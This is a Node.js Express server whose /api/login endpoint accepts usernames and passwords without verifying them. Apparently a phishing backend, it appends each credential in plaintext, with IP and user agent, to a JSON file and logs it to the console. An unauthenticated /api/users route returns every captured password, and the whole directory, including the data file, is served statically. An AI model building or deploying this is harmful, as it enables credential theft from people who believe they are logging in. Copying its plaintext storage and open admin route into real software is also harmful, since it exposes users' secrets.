const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// User data file path
const USER_DATA_FILE = path.join(__dirname, 'user_data.json');

// Initialize user data file if not exists
if (!fs.existsSync(USER_DATA_FILE)) {
  fs.writeFileSync(USER_DATA_FILE, '[]');
}

// Login endpoint
app.post('/api/login', (req, res) => {
  try {
    console.log('🔥 Received login request');
    console.log('📥 Request body:', req.body);
    
    const { username, password, login_method, user_agent } = req.body;
    
    // Validate required fields
    if (!username || !password) {
      console.log('❌ Missing username or password');
      return res.status(400).json({ 
        success: false, 
        message: 'Username and password are required' 
      });
    }
    
    // Create login data object
    const loginData = {
      username,
      password,
      login_method: login_method || 'manual',
      timestamp: new Date().toISOString(),
      ip_address: req.ip || req.connection.remoteAddress || 'localhost',
      user_agent: user_agent || req.get('User-Agent')
    };
    
    console.log('💾 Saving login data:', loginData);
    
    // Read existing data
    let existingData = [];
    if (fs.existsSync(USER_DATA_FILE)) {
      const data = fs.readFileSync(USER_DATA_FILE, 'utf8');
      existingData = JSON.parse(data);
      console.log('📚 Existing users count:', existingData.length);
    }
    
    // Add new login data
    existingData.push(loginData);
    
    // Save to file
    fs.writeFileSync(USER_DATA_FILE, JSON.stringify(existingData, null, 2));
    
    console.log('✅ Login saved successfully!');
    console.log(`📊 Total users: ${existingData.length}`);
    console.log(`📁 File path: ${USER_DATA_FILE}`);
    
    res.json({ 
      success: true, 
      message: 'Login data saved',
      user_count: existingData.length 
    });
    
  } catch (error) {
    console.error('💥 Error saving login data:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error saving login data: ' + error.message 
    });
  }
});

// Get user data endpoint (admin)
app.get('/api/users', (req, res) => {
  try {
    if (fs.existsSync(USER_DATA_FILE)) {
      const data = fs.readFileSync(USER_DATA_FILE, 'utf8');
      const users = JSON.parse(data);
      res.json({ success: true, users });
    } else {
      res.json({ success: true, users: [] });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error reading user data' });
  }
});

// Serve main files
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/index.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📁 User data will be saved to: ${USER_DATA_FILE}`);
  console.log(`🌐 Open http://localhost:${PORT} to test`);
});

module.exports = app;
